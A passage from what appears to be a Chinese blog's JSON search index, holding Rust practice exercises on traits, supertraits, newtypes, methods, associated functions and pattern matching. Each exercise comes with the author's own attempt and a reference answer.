- other.x, y: self.y - other.y, &#125; &#125;&#125; 12345678910impl&lt;T: Sub&lt;Output = T&gt;&gt; Sub&lt;Self&gt; for Point&lt;T&gt; &#123; type Output = Self; fn sub(self, other: Self) -&gt; Self::Output &#123; Point &#123; x: self.x - other.x, y: self.y - other.y, &#125; &#125;&#125; 12345678910impl&lt;T: Sub&lt;Output = T&gt;&gt; Sub for Point&lt;T&gt; &#123; type Output = Self; fn sub(self, other: Self) -&gt; Self::Output &#123; Point &#123; x: self.x - other.x, y: self.y - other.y, &#125; &#125;&#125; 完全限定语法在 Rust 中，两个不同特征的方法完全可以同名，且你可以为同一个类型同时实现这两个特征。这种情况下，就出现了一个问题：该如何调用这两个特征上定义的同名方法。为了解决这个问题，我们需要使用完全限定语法( Fully Qualified Syntax )。 1234567891011121314151617181920212223242526272829303132333435363738394041424344trait UsernameWidget &#123; fn get(&amp;self) -&gt; String;&#125;trait AgeWidget &#123; fn get(&amp;self) -&gt; u8;&#125;struct Form &#123; username: String, age: u8,&#125;impl UsernameWidget for Form &#123; fn get(&amp;self) -&gt; String &#123; self.username.clone() &#125;&#125;impl AgeWidget for Form &#123; fn get(&amp;self) -&gt; u8 &#123; self.age &#125;&#125;fn main() &#123; let form = Form&#123; username: &quot;rustacean&quot;.to_owned(), age: 28, &#125;; // 如果你反注释下面一行代码，将看到一个错误: Fully Qualified Syntax // 毕竟，这里有好几个同名的 `get` 方法 // // println!(&quot;&#123;&#125;&quot;, form.get()); let username = UsernameWidget::get(&amp;form); assert_eq!(&quot;rustacean&quot;.to_owned(), username); let age = AgeWidget::get(&amp;form); // 你还可以使用以下语法 `&lt;Form as AgeWidget&gt;::get` assert_eq!(28, age); println!(&quot;Success!&quot;)&#125; 🌟🌟 123456789101112131415161718192021222324252627282930313233343536373839trait Pilot &#123; fn fly(&amp;self) -&gt; String;&#125;trait Wizard &#123; fn fly(&amp;self) -&gt; String;&#125;struct Human;impl Pilot for Human &#123; fn fly(&amp;self) -&gt; String &#123; String::from(&quot;This is your captain speaking.&quot;) &#125;&#125;impl Wizard for Human &#123; fn fly(&amp;self) -&gt; String &#123; String::from(&quot;Up!&quot;) &#125;&#125;impl Human &#123; fn fly(&amp;self) -&gt; String &#123; String::from(&quot;*waving arms furiously*&quot;) &#125;&#125;fn main() &#123; let person = Human; assert_eq!(__, &quot;This is your captain speaking.&quot;); assert_eq!(__, &quot;Up!&quot;); assert_eq!(__, &quot;*waving arms furiously*&quot;); println!(&quot;Success!&quot;)&#125; My Answer 123456789101112131415161718192021222324252627282930313233343536373839trait Pilot &#123; fn fly(&amp;self) -&gt; String;&#125;trait Wizard &#123; fn fly(&amp;self) -&gt; String;&#125;struct Human;impl Pilot for Human &#123; fn fly(&amp;self) -&gt; String &#123; String::from(&quot;This is your captain speaking.&quot;) &#125;&#125;impl Wizard for Human &#123; fn fly(&amp;self) -&gt; String &#123; String::from(&quot;Up!&quot;) &#125;&#125;impl Human &#123; fn fly(&amp;self) -&gt; String &#123; String::from(&quot;*waving arms furiously*&quot;) &#125;&#125;fn main() &#123; let person = Human; assert_eq!(Pilot::fly(&amp;person), &quot;This is your captain speaking.&quot;); assert_eq!(Wizard::fly(&amp;person), &quot;Up!&quot;); assert_eq!(person.fly(), &quot;*waving arms furiously*&quot;); println!(&quot;Success!&quot;)&#125; Answer 12345678910111213141516171819202122232425262728293031323334353637trait Pilot &#123; fn fly(&amp;self) -&gt; String;&#125;trait Wizard &#123; fn fly(&amp;self) -&gt; String;&#125;struct Human;impl Pilot for Human &#123; fn fly(&amp;self) -&gt; String &#123; String::from(&quot;This is your captain speaking.&quot;) &#125;&#125;impl Wizard for Human &#123; fn fly(&amp;self) -&gt; String &#123; String::from(&quot;Up!&quot;) &#125;&#125;impl Human &#123; fn fly(&amp;self) -&gt; String &#123; String::from(&quot;*waving arms furiously*&quot;) &#125;&#125;fn main() &#123; let person = Human; assert_eq!(Pilot::fly(&amp;person), &quot;This is your captain speaking.&quot;); assert_eq!(Wizard::fly(&amp;person), &quot;Up!&quot;); assert_eq!(person.fly(), &quot;*waving arms furiously*&quot;); println!(&quot;Success!&quot;)&#125; Supertraits有些时候我们希望在特征上实现类似继承的特性，例如让一个特征 A 使用另一个特征 B 的功能。这种情况下，一个类型要实现特征 A 首先要实现特征 B， 特征 B 就被称为 supertrait 🌟🌟🌟 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253trait Person &#123; fn name(&amp;self) -&gt; String;&#125;// Person 是 Student 的 supertrait .// 实现 Student 需要同时实现 Person.trait Student: Person &#123; fn university(&amp;self) -&gt; String;&#125;trait Programmer &#123; fn fav_language(&amp;self) -&gt; String;&#125;// CompSciStudent (computer science student) 是 Programmer // 和 Student 的 subtrait. 实现 CompSciStudent 需要先实现这两个 supertraits.trait CompSciStudent: Programmer + Student &#123; fn git_username(&amp;self) -&gt; String;&#125;fn comp_sci_student_greeting(student: &amp;dyn CompSciStudent) -&gt; String &#123; format!( &quot;My name is &#123;&#125; and I attend &#123;&#125;. My favorite language is &#123;&#125;. My Git username is &#123;&#125;&quot;, student.name(), student.university(), student.fav_language(), student.git_username() )&#125;struct CSStudent &#123; name: String, university: String, fav_language: String, git_username: String&#125;// 为 CSStudent 实现所需的特征impl ...fn main() &#123; let student = CSStudent &#123; name: &quot;Sunfei&quot;.to_string(), university: &quot;XXX&quot;.to_string(), fav_language: &quot;Rust&quot;.to_string(), git_username: &quot;sunface&quot;.to_string() &#125;; // 填空 println!(&quot;&#123;&#125;&quot;, comp_sci_student_greeting(__));&#125; My Answer 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475trait Person &#123; fn name(&amp;self) -&gt; String;&#125;// Person 是 Student 的 supertrait .// 实现 Student 需要同时实现 Person.trait Student: Person &#123; fn university(&amp;self) -&gt; String;&#125;trait Programmer &#123; fn fav_language(&amp;self) -&gt; String;&#125;// CompSciStudent (computer science student) 是 Programmer // 和 Student 的 subtrait. 实现 CompSciStudent 需要先实现这两个 supertraits.trait CompSciStudent: Programmer + Student &#123; fn git_username(&amp;self) -&gt; String;&#125;fn comp_sci_student_greeting(student: &amp;dyn CompSciStudent) -&gt; String &#123; format!( &quot;My name is &#123;&#125; and I attend &#123;&#125;. My favorite language is &#123;&#125;. My Git username is &#123;&#125;&quot;, student.name(), student.university(), student.fav_language(), student.git_username() )&#125;struct CSStudent &#123; name: String, university: String, fav_language: String, git_username: String&#125;// 为 CSStudent 实现所需的特征impl Person for CSStudent&#123; fn name(&amp;self) -&gt; String &#123; self.name.clone() &#125;&#125;impl Student for CSStudent&#123; fn university(&amp;self) -&gt; String &#123; self.university.clone() &#125;&#125;impl Programmer for CSStudent&#123; fn fav_language(&amp;self) -&gt; String &#123; self.fav_language.clone() &#125;&#125;impl CompSciStudent for CSStudent&#123; fn git_username(&amp;self) -&gt; String &#123; self.git_username.clone() &#125;&#125;fn main() &#123; let student = CSStudent &#123; name: &quot;Sunfei&quot;.to_string(), university: &quot;XXX&quot;.to_string(), fav_language: &quot;Rust&quot;.to_string(), git_username: &quot;sunface&quot;.to_string() &#125;; // 填空 println!(&quot;&#123;&#125;&quot;, comp_sci_student_greeting(&amp;student));&#125; Answer 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071trait Person &#123; fn name(&amp;self) -&gt; String;&#125;// Person is a supertrait of Student.// Implementing Student requires you to also impl Person.trait Student: Person &#123; fn university(&amp;self) -&gt; String;&#125;trait Programmer &#123; fn fav_language(&amp;self) -&gt; String;&#125;// CompSciStudent (computer science student) is a subtrait of both Programmer // and Student. Implementing CompSciStudent requires you to impl both supertraits.trait CompSciStudent: Programmer + Student &#123; fn git_username(&amp;self) -&gt; String;&#125;fn comp_sci_student_greeting(student: &amp;dyn CompSciStudent) -&gt; String &#123; format!( &quot;My name is &#123;&#125; and I attend &#123;&#125;. My favorite language is &#123;&#125;. My Git username is &#123;&#125;&quot;, student.name(), student.university(), student.fav_language(), student.git_username() )&#125;struct CSStudent &#123; name: String, university: String, fav_language: String, git_username: String&#125;impl Person for CSStudent &#123; fn name(&amp;self) -&gt; String &#123; self.name.clone() &#125;&#125;impl Student for CSStudent &#123; fn university(&amp;self) -&gt; String &#123; self.university.clone() &#125;&#125;impl Programmer for CSStudent &#123; fn fav_language(&amp;self) -&gt; String &#123; self.fav_language.clone() &#125;&#125;impl CompSciStudent for CSStudent &#123; fn git_username(&amp;self) -&gt; String &#123; self.git_username.clone() &#125;&#125;fn main() &#123; let student = CSStudent &#123; name: &quot;Sunfei&quot;.to_string(), university: &quot;XXX&quot;.to_string(), fav_language: &quot;Rust&quot;.to_string(), git_username: &quot;sunface&quot;.to_string() &#125;; println!(&quot;&#123;&#125;&quot;, comp_sci_student_greeting(&amp;student));&#125; 关于孤儿原则的详细介绍请参见特征定义与实现的位置孤儿规则 和 在外部类型上实现外部特征。 🌟🌟 12345678910111213141516use std::fmt;// 定义一个 newtype `Pretty`impl fmt::Display for Pretty &#123; fn fmt(&amp;self, f: &amp;mut fmt::Formatter) -&gt; fmt::Result &#123; write!(f, &quot;\\&quot;&#123;&#125;\\&quot;&quot;, self.0.clone() + &quot;, world&quot;) &#125;&#125;fn main() &#123; let w = Pretty(&quot;hello&quot;.to_string()); println!(&quot;w = &#123;&#125;&quot;, w);&#125; My Answer 12345678910111213141516use std::fmt;// 定义一个 newtype `Pretty`struct Pretty(String);impl fmt::Display for Pretty &#123; fn fmt(&amp;self, f: &amp;mut fmt::Formatter) -&gt; fmt::Result &#123; write!(f, &quot;\\&quot;&#123;&#125;\\&quot;&quot;, self.0.clone() + &quot;, world&quot;) &#125;&#125;fn main() &#123; let w = Pretty(&quot;hello&quot;.to_string()); println!(&quot;w = &#123;&#125;&quot;, w);&#125; Answer 123456789101112131415use std::fmt;// DEFINE a newtype `Pretty`struct Pretty(String);impl fmt::Display for Pretty &#123; fn fmt(&amp;self, f: &amp;mut fmt::Formatter) -&gt; fmt::Result &#123; write!(f, &quot;\\&quot;&#123;&#125;\\&quot;&quot;, self.0.clone() + &quot;, world&quot;) &#125;&#125;fn main() &#123; let w = Pretty(&quot;hello&quot;.to_string()); println!(&quot;w = &#123;&#125;&quot;, w);&#125;","categories":[{"name":"编程语言","slug":"编程语言","permalink":"http://example.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/"},{"name":"Rust","slug":"编程语言/Rust","permalink":"http://example.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Rust/"},{"name":"练习实践","slug":"编程语言/Rust/练习实践","permalink":"http://example.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Rust/%E7%BB%83%E4%B9%A0%E5%AE%9E%E8%B7%B5/"}],"tags":[{"name":"Rust","slug":"Rust","permalink":"http://example.com/tags/Rust/"}]},{"title":"Rust学习 练习7 方法和关联函数","slug":"Rust学习-练习7-方法和关联函数","date":"2023-09-09T06:44:49.000Z","updated":"2023-09-10T07:39:28.845Z","comments":true,"path":"2023/09/09/Rust学习-练习7-方法和关联函数/","link":"","permalink":"http://example.com/2023/09/09/Rust%E5%AD%A6%E4%B9%A0-%E7%BB%83%E4%B9%A07-%E6%96%B9%E6%B3%95%E5%92%8C%E5%85%B3%E8%81%94%E5%87%BD%E6%95%B0/","excerpt":"示例 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104struct Point &#123; x: f64, y: f64,&#125;// `Point` 的关联函数都放在下面的 `impl` 语句块中impl Point &#123; // 关联函数的使用方法跟构造器非常类似 fn origin() -&gt; Point &#123; Point &#123; x: 0.0, y: 0.0 &#125; &#125; // 另外一个关联函数，有两个参数 fn new(x: f64, y: f64) -&gt; Point &#123; Point &#123; x: x, y: y &#125; &#125;&#125;struct Rectangle &#123; p1: Point, p2: Point,&#125;impl Rectangle &#123; // 这是一个方法 // `&amp;self` 是 `self: &amp;Self` 的语法糖 // `Self` 是当前调用对象的类型，对于本例来说 `Self` = `Rectangle` fn area(&amp;self) -&gt; f64 &#123; // 使用点操作符可以访问 `self` 中的结构体字段 let Point &#123; x: x1, y: y1 &#125; = self.p1; let Point &#123; x: x2, y: y2 &#125; = self.p2; // `abs` 是一个 `f64` 类型的方法，会返回调用者的绝对值 ((x1 - x2) * (y1 - y2)).abs() &#125; fn perimeter(&amp;self) -&gt; f64 &#123; let Point &#123; x: x1, y: y1 &#125; = self.p1; let Point &#123; x: x2, y: y2 &#125; = self.p2; 2.0 * ((x1 - x2).abs() + (y1 - y2).abs()) &#125; // 该方法要求调用者是可变的，`&amp;mut self` 是 `self: &amp;mut Self` 的语法糖 fn translate(&amp;mut self, x: f64, y: f64) &#123; self.p1.x += x; self.p2.x += x; self.p1.y += y; self.p2.y += y; &#125;&#125;// `Pair` 持有两个分配在堆上的整数struct Pair(Box&lt;i32&gt;, Box&lt;i32&gt;);impl Pair &#123; // 该方法会拿走调用者的所有权 // `self` 是 `self: Self` 的语法糖 fn destroy(self) &#123; let Pair(first, second) = self; println!(&quot;Destroying Pair(&#123;&#125;, &#123;&#125;)&quot;, first, second); // `first` 和 `second` 在这里超出作用域并被释放 &#125;&#125;fn main() &#123; let rectangle = Rectangle &#123; // 关联函数的调用不是通过点操作符，而是使用 `::` p1: Point::origin(), p2: Point::new(3.0, 4.0), &#125;; // 方法才是通过点操作符调用 // 注意，这里的方法需要的是 `&amp;self` 但是我们并没有使用 `(&amp;rectangle).perimeter()` 来调用，原因在于： // 编译器会帮我们自动取引用 // `rectangle.perimeter()` === `Rectangle::perimeter(&amp;rectangle)` println!(&quot;Rectangle perimeter: &#123;&#125;&quot;, rectangle.perimeter()); println!(&quot;Rectangle area: &#123;&#125;&quot;, rectangle.area()); let mut square = Rectangle &#123; p1: Point::origin(), p2: Point::new(1.0, 1.0), &#125;; // 错误！`rectangle` 是不可变的，但是这个方法要求一个可变的对象 //rectangle.translate(1.0, 0.0); // TODO ^ 试着反注释此行，看看会发生什么 // 可以！可变对象可以调用可变的方法 square.translate(1.0, 1.0); let pair = Pair(Box::new(1), Box::new(2)); pair.destroy(); // Error! 上一个 `destroy` 调用拿走了 `pair` 的所有权 //pair.destroy(); // TODO ^ 试着反注释此行&#125; 方法（method）","text":"示例 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104struct Point &#123; x: f64, y: f64,&#125;// `Point` 的关联函数都放在下面的 `impl` 语句块中impl Point &#123; // 关联函数的使用方法跟构造器非常类似 fn origin() -&gt; Point &#123; Point &#123; x: 0.0, y: 0.0 &#125; &#125; // 另外一个关联函数，有两个参数 fn new(x: f64, y: f64) -&gt; Point &#123; Point &#123; x: x, y: y &#125; &#125;&#125;struct Rectangle &#123; p1: Point, p2: Point,&#125;impl Rectangle &#123; // 这是一个方法 // `&amp;self` 是 `self: &amp;Self` 的语法糖 // `Self` 是当前调用对象的类型，对于本例来说 `Self` = `Rectangle` fn area(&amp;self) -&gt; f64 &#123; // 使用点操作符可以访问 `self` 中的结构体字段 let Point &#123; x: x1, y: y1 &#125; = self.p1; let Point &#123; x: x2, y: y2 &#125; = self.p2; // `abs` 是一个 `f64` 类型的方法，会返回调用者的绝对值 ((x1 - x2) * (y1 - y2)).abs() &#125; fn perimeter(&amp;self) -&gt; f64 &#123; let Point &#123; x: x1, y: y1 &#125; = self.p1; let Point &#123; x: x2, y: y2 &#125; = self.p2; 2.0 * ((x1 - x2).abs() + (y1 - y2).abs()) &#125; // 该方法要求调用者是可变的，`&amp;mut self` 是 `self: &amp;mut Self` 的语法糖 fn translate(&amp;mut self, x: f64, y: f64) &#123; self.p1.x += x; self.p2.x += x; self.p1.y += y; self.p2.y += y; &#125;&#125;// `Pair` 持有两个分配在堆上的整数struct Pair(Box&lt;i32&gt;, Box&lt;i32&gt;);impl Pair &#123; // 该方法会拿走调用者的所有权 // `self` 是 `self: Self` 的语法糖 fn destroy(self) &#123; let Pair(first, second) = self; println!(&quot;Destroying Pair(&#123;&#125;, &#123;&#125;)&quot;, first, second); // `first` 和 `second` 在这里超出作用域并被释放 &#125;&#125;fn main() &#123; let rectangle = Rectangle &#123; // 关联函数的调用不是通过点操作符，而是使用 `::` p1: Point::origin(), p2: Point::new(3.0, 4.0), &#125;; // 方法才是通过点操作符调用 // 注意，这里的方法需要的是 `&amp;self` 但是我们并没有使用 `(&amp;rectangle).perimeter()` 来调用，原因在于： // 编译器会帮我们自动取引用 // `rectangle.perimeter()` === `Rectangle::perimeter(&amp;rectangle)` println!(&quot;Rectangle perimeter: &#123;&#125;&quot;, rectangle.perimeter()); println!(&quot;Rectangle area: &#123;&#125;&quot;, rectangle.area()); let mut square = Rectangle &#123; p1: Point::origin(), p2: Point::new(1.0, 1.0), &#125;; // 错误！`rectangle` 是不可变的，但是这个方法要求一个可变的对象 //rectangle.translate(1.0, 0.0); // TODO ^ 试着反注释此行，看看会发生什么 // 可以！可变对象可以调用可变的方法 square.translate(1.0, 1.0); let pair = Pair(Box::new(1), Box::new(2)); pair.destroy(); // Error! 上一个 `destroy` 调用拿走了 `pair` 的所有权 //pair.destroy(); // TODO ^ 试着反注释此行&#125; 方法（method） 🌟🌟 方法跟函数类似：都是使用 fn 声明，有参数和返回值。但是与函数不同的是，方法定义在结构体的上下文中(枚举、特征对象也可以定义方法)，而且方法的第一个参数一定是 self 或其变体 &amp;self 、&amp;mut self，self 代表了当前调用的结构体实例。 123456789101112131415struct Rectangle &#123; width: u32, height: u32,&#125;impl Rectangle &#123; // 完成 area 方法，返回矩形 Rectangle 的面积 fn area&#125;fn main() &#123; let rect1 = Rectangle &#123; width: 30, height: 50 &#125;; assert_eq!(rect1.area(), 1500);&#125; My Answer 1234567891011121314151617struct Rectangle &#123; width: u32, height: u32,&#125;impl Rectangle &#123; // 完成 area 方法，返回矩形 Rectangle 的面积 fn area(self) -&gt; u32&#123; self.width * self.height &#125;&#125;fn main() &#123; let rect1 = Rectangle &#123; width: 30, height: 50 &#125;; assert_eq!(rect1.area(), 1500);&#125; Answer 12345678910111213141516struct Rectangle &#123; width: u32, height: u32,&#125;impl Rectangle &#123; fn area(&amp;self) -&gt; u32 &#123; self.width * self.height &#125;&#125;fn main() &#123; let rect1 = Rectangle &#123; width: 30, height: 50 &#125;; assert_eq!(rect1.area(), 1500);&#125; 🌟🌟 self 会拿走当前结构体实例(调用对象)的所有权，而 &amp;self 却只会借用一个不可变引用，&amp;mut self 会借用一个可变引用 1234567891011121314151617181920// 只填空，不要删除任何代码行!#[derive(Debug)]struct TrafficLight &#123; color: String,&#125;impl TrafficLight &#123; pub fn show_state(__) &#123; println!(&quot;the current state is &#123;&#125;&quot;, __.color); &#125;&#125;fn main() &#123; let light = TrafficLight&#123; color: &quot;red&quot;.to_owned(), &#125;; // 不要拿走 `light` 的所有权 light.show_state(); // 否则下面代码会报错 println!(&quot;&#123;:?&#125;&quot;, light);&#125; My Answer 1234567891011121314151617181920// 只填空，不要删除任何代码行!#[derive(Debug)]struct TrafficLight &#123; color: String,&#125;impl TrafficLight &#123; pub fn show_state(&amp;self) &#123; println!(&quot;the current state is &#123;&#125;&quot;, self.color); &#125;&#125;fn main() &#123; let light = TrafficLight&#123; color: &quot;red&quot;.to_owned(), &#125;; // 不要拿走 `light` 的所有权 light.show_state(); // 否则下面代码会报错 println!(&quot;&#123;:?&#125;&quot;, light);&#125; Answer 1234567891011121314151617181920#[derive(Debug)]struct TrafficLight &#123; color: String,&#125;impl TrafficLight &#123; pub fn show_state(&amp;self) &#123; println!(&quot;the current state is &#123;&#125;&quot;, self.color); &#125;&#125;fn main() &#123; let light = TrafficLight &#123; color: &quot;red&quot;.to_owned(), &#125;; // Don&#x27;t take the ownership of `light` here light.show_state(); // ..otherwise, there will be an error below println!(&quot;&#123;:?&#125;&quot;, light);&#125; 🌟🌟 &amp;self 实际上是 self: &amp;Self 的缩写或者说语法糖 12345678910111213141516struct TrafficLight &#123; color: String,&#125;impl TrafficLight &#123; // 使用 `Self` 填空 pub fn show_state(__) &#123; println!(&quot;the current state is &#123;&#125;&quot;, self.color); &#125; // 填空，不要使用 `Self` 或其变体 pub fn change_state(__) &#123; self.color = &quot;green&quot;.to_string() &#125;&#125;fn main() &#123;&#125; My Answer 没理解题目是什么意思 Answer 1234567891011121314151617struct TrafficLight &#123; color: String,&#125;impl TrafficLight &#123; // using `Self` to fill in the blank pub fn show_state(self: &amp;Self) &#123; println!(&quot;the current state is &#123;&#125;&quot;, self.color); &#125; // fill in the blank, DON&#x27;T use any variants of `Self` pub fn change_state(&amp;mut self) &#123; self.color = &quot;green&quot;.to_string() &#125;&#125;fn main() &#123;&#125; 关联函数 🌟🌟 定义在 impl 语句块中的函数被称为关联函数，因为它们跟当前类型关联在一起。关联函数与方法最大的区别就是它第一个参数不是 self ，原因是它们不需要使用当前的实例，因此关联函数往往可以用于构造函数：初始化一个实例对象。 1234567891011121314151617181920#[derive(Debug)]struct TrafficLight &#123; color: String,&#125;impl TrafficLight &#123; // 1. 实现下面的关联函数 `new`, // 2. 该函数返回一个 TrafficLight 实例，包含 `color` &quot;red&quot; // 3. 该函数必须使用 `Self` 作为类型，不能在签名或者函数体中使用 `TrafficLight` pub fn new() pub fn get_state(&amp;self) -&gt; &amp;str &#123; &amp;self.color &#125;&#125;fn main() &#123; let light = TrafficLight::new(); assert_eq!(light.get_state(), &quot;red&quot;);&#125; My Answer 12345678910111213141516171819202122#[derive(Debug)]struct TrafficLight &#123; color: String,&#125;impl TrafficLight &#123; // 1. 实现下面的关联函数 `new`, // 2. 该函数返回一个 TrafficLight 实例，包含 `color` &quot;red&quot; // 3. 该函数必须使用 `Self` 作为类型，不能在签名或者函数体中使用 `TrafficLight` pub fn new(color:String) -&gt; TrafficLight&#123; TrafficLight &#123; color:color &#125; &#125; pub fn get_state(&amp;self) -&gt; &amp;str &#123; &amp;self.color &#125;&#125;fn main() &#123; let light = TrafficLight::new(&quot;red&quot;.to_string()); assert_eq!(light.get_state(), &quot;red&quot;);&#125; Answer 123456789101112131415161718192021222324#[derive(Debug)]struct TrafficLight &#123; color: String,&#125;impl TrafficLight &#123; // 1. implement a associated function `new`, // 2. it will return a TrafficLight contains color &quot;red&quot; // 3. must use `Self`, DONT use `TrafficLight` pub fn new() -&gt; Self &#123; Self &#123; color: &quot;red&quot;.to_string() &#125; &#125; pub fn get_state(&amp;self) -&gt; &amp;str &#123; &amp;self.color &#125;&#125;fn main() &#123; let light = TrafficLight::new(); assert_eq!(light.get_state(), &quot;red&quot;);&#125; 多个impl语句块 🌟 每一个结构体允许拥有多个 impl 语句块 12345678910111213141516struct Rectangle &#123; width: u32, height: u32,&#125;// 使用多个 `impl` 语句块重写下面的代码impl Rectangle &#123; fn area(&amp;self) -&gt; u32 &#123; self.width * self.height &#125; fn can_hold(&amp;self, other: &amp;Rectangle) -&gt; bool &#123; self.width &gt; other.width &amp;&amp; self.height &gt; other.height &#125;&#125;fn main() &#123;&#125; My Answer 1234567891011121314151617181920struct Rectangle &#123; width: u32, height: u32, &#125; // 使用多个 `impl` 语句块重写下面的代码 impl Rectangle &#123; fn area(&amp;self) -&gt; u32 &#123; self.width * self.height &#125; &#125; impl Rectangle &#123; fn can_hold(&amp;self, other: &amp;Rectangle) -&gt; bool &#123; self.width &gt; other.width &amp;&amp; self.height &gt; other.height &#125; &#125; fn main() &#123;&#125; Answer 12345678910111213141516171819struct Rectangle &#123; width: u32, height: u32,&#125;// rewrite Rectangle to use multiple `impl` blocksimpl Rectangle &#123; fn area(&amp;self) -&gt; u32 &#123; self.width * self.height &#125;&#125;impl Rectangle &#123; fn can_hold(&amp;self, other: &amp;Rectangle) -&gt; bool &#123; self.width &gt; other.width &amp;&amp; self.height &gt; other.height &#125;&#125;fn main() &#123;&#125; 为枚举类型实现方法 🌟🌟🌟 我们还可以为枚举类型定义方法 12345678910111213141516171819#[derive(Debug)]enum TrafficLightColor &#123; Red, Yellow, Green,&#125;// 为 TrafficLightColor 实现所需的方法impl TrafficLightColor &#123;&#125;fn main() &#123; let c = TrafficLightColor::Yellow; assert_eq!(c.color(), &quot;yellow&quot;); println!(&quot;&#123;:?&#125;&quot;,c);&#125; My Answer 12345678910111213141516171819#[derive(Debug)]enum TrafficLightColor &#123; Red, Yellow, Green,&#125;// 为 TrafficLightColor 实现所需的方法impl TrafficLightColor &#123;&#125;fn main() &#123; let c = TrafficLightColor::Yellow; assert_eq!(c.color(), &quot;yellow&quot;); println!(&quot;&#123;:?&#125;&quot;,c);&#125; Answer 12345678910111213141516171819202122232425#[derive(Debug)]enum TrafficLightColor &#123; Red, Yellow, Green,&#125;// implement TrafficLightColor with a methodimpl TrafficLightColor &#123; fn color(&amp;self) -&gt; String &#123; match *self &#123; TrafficLightColor::Red =&gt; &quot;red&quot;.to_string(), TrafficLightColor::Yellow =&gt; &quot;yellow&quot;.to_string(), TrafficLightColor::Green =&gt; &quot;green&quot;.to_string(), &#125; &#125;&#125;fn main() &#123; let c = TrafficLightColor::Yellow; assert_eq!(c.color(), &quot;yellow&quot;); println!(&quot;&#123;:?&#125;&quot;, c);&#125;","categories":[{"name":"编程语言","slug":"编程语言","permalink":"http://example.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/"},{"name":"Rust","slug":"编程语言/Rust","permalink":"http://example.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Rust/"},{"name":"练习实践","slug":"编程语言/Rust/练习实践","permalink":"http://example.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Rust/%E7%BB%83%E4%B9%A0%E5%AE%9E%E8%B7%B5/"}],"tags":[{"name":"Rust","slug":"Rust","permalink":"http://example.com/tags/Rust/"}]},{"title":"Rust学习 练习6 模式匹配","slug":"Rust学习-练习6-模式匹配","date":"2023-09-06T00:53:30.000Z","updated":"2023-09-10T07:39:13.140Z","comments":true,"path":"2023/09/06/Rust学习-练习6-模式匹配/","link":"","permalink":"http://example.com/2023/09/06/Rust%E5%AD%A6%E4%B9%A0-%E7%BB%83%E4%B9%A06-%E6%A8%A1%E5%BC%8F%E5%8C%B9%E9%85%8D/","excerpt":"match，matches！和if letmatch 🌟🌟 123456789101112131415161718// 填空enum Direction &#123; East, West, North, South,&#125;fn main() &#123; let dire = Direction::South; match dire &#123; Direction::East =&gt; println!(&quot;East&quot;), __ =&gt; &#123; // 在这里匹配 South 或 North println!(&quot;South or North&quot;); &#125;, _ =&gt; println!(__), &#125;;&#125; My Answer 12345678910111213141516171819// 填空enum Direction &#123; East, West, North, South,&#125;fn main() &#123; let dire = Direction::South; match dire &#123; Direction::East =&gt; println!(&quot;East&quot;), Direction::South | Direction::North =&gt; &#123; // 在这里匹配 South 或 North println!(&quot;South or North&quot;); &#125; _ =&gt; println!(&quot;other&quot;), &#125;;&#125; Answer 1234567891011121314fn main() &#123; let boolean = true; // fill the blank with an match expression: // // boolean = true =&gt; binary = 1 // boolean = false =&gt; binary = 0 let binary = match boolean &#123; true =&gt; 1, false =&gt; 0 &#125;; assert_eq!(binary, 1);&#125; 🌟🌟 match 是一个表达式，因此可以用在赋值语句中 1234567891011fn main() &#123; let boolean = true; // 使用 match 表达式填空，并满足以下条件 // // boolean = true =&gt; binary = 1 // boolean = false =&gt; binary = 0 let binary = __; assert_eq!(binary, 1);&#125; My Answer 1234567891011121314fn main() &#123; let boolean = true; // 使用 match 表达式填空，并满足以下条件 // // boolean = true =&gt; binary = 1 // boolean = false =&gt; binary = 0 let binary = match boolean&#123; true =&gt; 1, false =&gt; 0, &#125;; assert_eq!(binary, 1);&#125; Answer 1234567891011121314fn main() &#123; let boolean = true; // fill the blank with an match expression: // // boolean = true =&gt; binary = 1 // boolean = false =&gt; binary = 0 let binary = match boolean &#123; true =&gt; 1, false =&gt; 0 &#125;; assert_eq!(binary, 1);&#125; 🌟🌟 使用 match 匹配出枚举成员持有的值 123456789101112131415161718192021222324252627282930313233// 填空enum Message &#123; Quit, Move &#123; x: i32, y: i32 &#125;, Write(String), ChangeColor(i32, i32, i32),&#125;fn main() &#123; let msgs = [ Message::Quit, Message::Move&#123;x:1, y:3&#125;, Message::ChangeColor(255,255,0) ]; for msg in msgs &#123; show_message(msg) &#125;&#125; fn show_message(msg: Message) &#123; match msg &#123; __ =&gt; &#123; // 这里匹配 Message::Move assert_eq!(a, 1); assert_eq!(b, 3); &#125;, Message::ChangeColor(_, g, b) =&gt; &#123; assert_eq!(g, __); assert_eq!(b, __); &#125; __ =&gt; println!(&quot;no data in these variants&quot;) &#125;&#125; My Answer 123456789101112131415161718192021222324252627282930313233// 填空enum Message &#123; Quit, Move &#123; x: i32, y: i32 &#125;, Write(String), ChangeColor(i32, i32, i32),&#125;fn main() &#123; let msgs = [ Message::Quit, Message::Move&#123;x:1, y:3&#125;, Message::ChangeColor(255,255,0) ]; for msg in msgs &#123; show_message(msg) &#125;&#125; fn show_message(msg: Message) &#123; match msg &#123; Message::Move &#123;x:a, y:b&#125; =&gt; &#123; // 这里匹配 Message::Move assert_eq!(a, 1); assert_eq!(b, 3); &#125;, Message::ChangeColor(_, g, b) =&gt; &#123; assert_eq!(g, 255); assert_eq!(b, 0); &#125; __ =&gt; println!(&quot;no data in these variants&quot;) &#125;&#125; Answer 1234567891011121314151617181920212223242526272829303132enum Message &#123; Quit, Move &#123; x: i32, y: i32 &#125;, Write(String), ChangeColor(i32, i32, i32),&#125;fn main() &#123; let msgs = [ Message::Quit, Message::Move&#123;x:1, y:3&#125;, Message::ChangeColor(255,255,0) ]; for msg in msgs &#123; show_message(msg) &#125;&#125; fn 